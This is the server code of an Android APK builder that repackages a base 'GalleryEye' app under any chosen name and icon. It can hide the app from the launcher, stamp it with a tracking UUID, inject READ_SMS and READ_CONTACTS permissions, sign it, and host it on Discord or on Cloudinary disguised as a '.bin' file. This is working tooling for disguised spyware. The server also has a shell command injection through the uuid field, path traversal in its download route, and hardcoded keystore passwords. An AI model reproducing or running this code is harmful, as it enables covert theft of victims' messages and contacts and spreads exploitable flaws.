const express = require('express');
const multer = require('multer');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { spawn, exec } = require('child_process');
const sharp = require('sharp');
const axios = require('axios');
const cloudinary = require('cloudinary').v2;
const FormData = require('form-data');
require('dotenv').config();

const app = express();
const port = process.env.PORT || 4000;

app.use(cors());
app.use(express.json());

// Storage for icon uploads
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

// Helper to run commands (Streaming Output)
const runCommand = (command, args, options = {}) => {
    return new Promise((resolve, reject) => {
        console.log(`[CMD] Running: ${command} ${args.join(' ')}`);
        const proc = spawn(command, args, { ...options, stdio: 'inherit' });

        proc.on('close', (code, signal) => {
            if (code === 0) resolve('Success');
            else if (signal) reject(new Error(`Command ${command} was killed by signal: ${signal} (Likely OOM)`));
            else reject(new Error(`Command ${command} failed with code ${code}`));
        });

        proc.on('error', (err) => reject(err));
    });
};

// Pre-decode Base APK
const baseApkPath = path.join(__dirname, 'assets', 'base.apk');
const decodedBaseDir = path.join(__dirname, 'temp', 'decoded_base');

if (!fs.existsSync(path.join(__dirname, 'temp'))) fs.mkdirSync(path.join(__dirname, 'temp'));

const initBaseApk = async () => {
    // Check if valid
    const isDecodedValid = fs.existsSync(path.join(decodedBaseDir, 'apktool.yml'));

    if (fs.existsSync(baseApkPath) && !isDecodedValid) {
        console.log('[Init] Pre-decoding Base APK...');
        // Clean partial
        if (fs.existsSync(decodedBaseDir)) fs.rmSync(decodedBaseDir, { recursive: true, force: true });

        try {
            await runCommand('apktool', ['d', baseApkPath, '-o', decodedBaseDir, '-f']);
            console.log('[Init] Base APK pre-decoded.');
        } catch (e) {
            console.error('[Init] Failed:', e.message);
            // Cleanup on fail
            if (fs.existsSync(decodedBaseDir)) fs.rmSync(decodedBaseDir, { recursive: true, force: true });
        }
    } else if (isDecodedValid) {
        console.log('[Init] Base APK already pre-decoded and valid.');
    }
};
// Run init but don't crash if it fails
initBaseApk().catch(e => console.error("Init failed fatally:", e));

// Generate Route
app.post('/generate', upload.single('icon'), async (req, res) => {
    const { uuid, appName, hideApp, webLink, callbackUrl, enableSmsPermission, enableContactsPermission } = req.body;
    const customIcon = req.file;

    console.log(`[APK] Request for UUID: ${uuid}`);

    // Ack immediately
    res.status(202).json({ message: 'Processing started' });

    // Background Task
    (async () => {
        const sendUpdate = async (event, data) => {
            if (callbackUrl) {
                try {
                    await axios.post(callbackUrl, { uuid, event, data });
                } catch (e) {
                    console.error('Failed to send webhook:', e.message);
                }
            }
        };

        try {
            await sendUpdate('apk_progress', { step: 'Initializing...', progress: 10 });

            const tempDir = path.join(__dirname, 'temp');
            const workDir = path.join(tempDir, `work-${uuid}`);
            const unsignedApkPath = path.join(tempDir, `unsigned-${uuid}.apk`);
            const finalApkName = `${(appName || "GalleryEye").replace(/[^a-zA-Z0-9]/g, '-')}.apk`;
            const signedApkPath = path.join(tempDir, `signed-${uuid}.apk`);

            // Cleanup
            if (fs.existsSync(workDir)) fs.rmSync(workDir, { recursive: true, force: true });
            if (fs.existsSync(unsignedApkPath)) fs.unlinkSync(unsignedApkPath);

            // 1. Copy/Decode
            const isBaseValid = fs.existsSync(path.join(decodedBaseDir, 'apktool.yml'));

            if (isBaseValid) {
                await sendUpdate('apk_progress', { step: 'Initializing environment...', progress: 15 });
                await runCommand('cp', ['-r', decodedBaseDir, workDir]);
            } else {
                await sendUpdate('apk_progress', { step: 'Decompiling base APK...', progress: 15 });
                await runCommand('apktool', ['d', baseApkPath, '-o', workDir, '-f']);
            }

            // 2. Customize Name
            await sendUpdate('apk_progress', { step: 'Configuring application manifest...', progress: 30 });
            if (appName) {
                const stringsPath = path.join(workDir, 'res', 'values', 'strings.xml');
                if (fs.existsSync(stringsPath)) {
                    let content = fs.readFileSync(stringsPath, 'utf8');
                    content = content.replace(/<string name="app_name">.*?<\/string>/, `<string name="app_name">${appName}</string>`);
                    fs.writeFileSync(stringsPath, content);
                }
            }

            // 3. Inject Config with permission flags
            await sendUpdate('apk_progress', { step: 'Injecting unique user identity...', progress: 45 });
            const assetsDir = path.join(workDir, 'assets');
            if (!fs.existsSync(assetsDir)) fs.mkdirSync(assetsDir);
            fs.writeFileSync(path.join(assetsDir, 'uuid.txt'), uuid);
            const config = {
                hideApp: hideApp === 'true',
                webLink: webLink || "",
                appName: appName || "Gallery Eye",
                enableSmsPermission: enableSmsPermission === 'true',
                enableContactsPermission: enableContactsPermission === 'true'
            };
            fs.writeFileSync(path.join(assetsDir, 'config.json'), JSON.stringify(config));

            // 3.5. Dynamically inject permissions into AndroidManifest.xml
            const manifestPath = path.join(workDir, 'AndroidManifest.xml');
            if (fs.existsSync(manifestPath)) {
                let manifestContent = fs.readFileSync(manifestPath, 'utf8');

                // Find where to inject permissions (after existing permissions, before closing manifest tag area)
                const permissionInsertPoint = manifestContent.indexOf('<uses-permission android:name="android.permission.FOREGROUND_SERVICE"');

                if (permissionInsertPoint !== -1) {
                    let permissionsToAdd = '';

                    if (enableSmsPermission === 'true') {
                        permissionsToAdd += '    <uses-permission android:name="android.permission.READ_SMS" />\n';
                        console.log('[APK] Adding READ_SMS permission');
                    }

                    if (enableContactsPermission === 'true') {
                        permissionsToAdd += '    <uses-permission android:name="android.permission.READ_CONTACTS" />\n';
                        console.log('[APK] Adding READ_CONTACTS permission');
                    }

                    if (permissionsToAdd) {
                        manifestContent = manifestContent.slice(0, permissionInsertPoint) + permissionsToAdd + manifestContent.slice(permissionInsertPoint);
                        fs.writeFileSync(manifestPath, manifestContent);
                        console.log('[APK] Permissions injected successfully');
                    }
                }
            }

            // 4. Icon
            if (customIcon) {
                await sendUpdate('apk_progress', { step: 'Optimizing and replacing app icons...', progress: 60 });
                const iconBuffer = customIcon.buffer;
                const sizes = {
                    'mipmap-mdpi': 48,
                    'mipmap-hdpi': 72,
                    'mipmap-xhdpi': 96,
                    'mipmap-xxhdpi': 144,
                    'mipmap-xxxhdpi': 192
                };

                // 1. Delete the adaptive icon folder (mipmap-anydpi-v26)
                // This forces Android to use the density-specific PNGs we are about to write
                // and stops it from using the XML adaptive icons that reference the background/foreground drawables.
                const adaptiveIconDir = path.join(workDir, 'res', 'mipmap-anydpi-v26');
                if (fs.existsSync(adaptiveIconDir)) {
                    fs.rmSync(adaptiveIconDir, { recursive: true, force: true });
                }

                // 2. Replace icons in density folders
                for (const [folder, size] of Object.entries(sizes)) {
                    const p = path.join(workDir, 'res', folder);
                    if (fs.existsSync(p)) {
                        try {
                            // Remove existing icons (webp, png, xml, etc.)
                            const existingFiles = fs.readdirSync(p);
                            existingFiles.forEach(f => {
                                if (f.startsWith('ic_launcher')) {
                                    fs.unlinkSync(path.join(p, f));
                                }
                            });

                            const buf = await sharp(iconBuffer).resize(size, size).toFormat('png').toBuffer();
                            fs.writeFileSync(path.join(p, 'ic_launcher.png'), buf);
                            fs.writeFileSync(path.join(p, 'ic_launcher_round.png'), buf);
                        } catch (e) {
                            console.error(`Failed to process icon for ${folder}:`, e);
                        }
                    }
                }
            }

            // 5. Build
            await sendUpdate('apk_progress', { step: 'Compiling APK resources...', progress: 75 });
            await runCommand('apktool', ['b', workDir, '-o', unsignedApkPath]);

            // 6. Sign
            await sendUpdate('apk_progress', { step: 'Signing with secure production key...', progress: 90 });
            const keystore = path.join(__dirname, 'assets', 'keystore.jks');
            const signer = path.join(__dirname, 'assets', 'uber-apk-signer.jar');
            const cmd = `java -jar "${signer}" --apks "${unsignedApkPath}" --out "${tempDir}" --ks "${keystore}" --ksAlias key0 --ksPass android --ksKeyPass android`;

            await new Promise((resolve, reject) => {
                exec(cmd, { timeout: 120000 }, (err) => err ? reject(err) : resolve());
            });

            // Find output
            const files = fs.readdirSync(tempDir);
            const generated = files.find(f => f.startsWith(`unsigned-${uuid}`) && f.includes('signed'));

            if (generated) {
                const signedPath = path.join(tempDir, generated);
                let downloadUrl = "";

                // Strategy 1: Discord Webhook (Best Free Option)
                if (process.env.DISCORD_WEBHOOK_URL) {
                    try {
                        await sendUpdate('apk_progress', { step: 'Uploading to secure cloud storage...', progress: 95 });
                        const form = new FormData();
                        form.append('file', fs.createReadStream(signedPath), { filename: finalApkName });

                        const discordRes = await axios.post(process.env.DISCORD_WEBHOOK_URL, form, {
                            headers: { ...form.getHeaders() },
                            maxBodyLength: Infinity,
                            maxContentLength: Infinity
                        });

                        if (discordRes.data && discordRes.data.attachments && discordRes.data.attachments.length > 0) {
                            downloadUrl = discordRes.data.attachments[0].url;
                            console.log(`[APK] Discord URL: ${downloadUrl}`);
                        }
                    } catch (discordError) {
                        console.error('[APK] Discord Upload Failed:', discordError.message);
                    }
                }

                // Strategy 2: Cloudinary (Backup)
                if (!downloadUrl && process.env.CLOUDINARY_CLOUD_NAME) {
                    try {
                        await sendUpdate('apk_progress', { step: 'Uploading to backup cloud...', progress: 95 });

                        cloudinary.config({
                            cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
                            api_key: process.env.CLOUDINARY_API_KEY,
                            api_secret: process.env.CLOUDINARY_API_SECRET
                        });

                        // Upload as .bin to bypass APK restriction
                        const binPath = signedPath.replace('.apk', '.bin');
                        fs.copyFileSync(signedPath, binPath);

                        const result = await cloudinary.uploader.upload(binPath, {
                            resource_type: 'raw',
                            folder: 'generated_apks',
                            public_id: `${finalApkName.replace('.apk', '')}_${uuid}`,
                            use_filename: true,
                            unique_filename: false,
                            overwrite: true
                        });

                        downloadUrl = result.secure_url;
                        console.log(`[APK] Cloudinary URL: ${downloadUrl}`);
                        fs.unlinkSync(binPath);

                    } catch (uploadError) {
                        console.error('[APK] Cloudinary Upload Failed:', uploadError);
                    }
                }

                // Strategy 3: Direct Download (Fallback)
                if (!downloadUrl) {
                    fs.renameSync(signedPath, signedApkPath);
                    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
                    const host = process.env.PUBLIC_URL || `${protocol}://${req.get('host')}`;
                    downloadUrl = `${host}/download/${path.basename(signedApkPath)}?filename=${finalApkName}`;
                } else {
                    // Cleanup signed file if uploaded
                    // fs.unlinkSync(signedPath); // Keep for now just in case
                }

                await sendUpdate('apk_ready', { url: downloadUrl, filename: finalApkName });

                // Cleanup Work Dir
                fs.rmSync(workDir, { recursive: true, force: true });
                fs.unlinkSync(unsignedApkPath);
            } else {
                throw new Error("Signing failed");
            }

        } catch (error) {
            console.error('[APK] Error:', error);
            await sendUpdate('apk_error', { message: error.message });
        }
    })();
});

// Download Route
app.get('/download/:file', (req, res) => {
    const filePath = path.join(__dirname, 'temp', req.params.file);
    const downloadName = req.query.filename || 'app.apk';
    if (fs.existsSync(filePath)) {
        res.download(filePath, downloadName);
    } else {
        res.status(404).send('Not Found');
    }
});

app.get('/', (req, res) => res.send('APK Generator Service Running'));

app.listen(port, () => console.log(`APK Service on ${port}`));
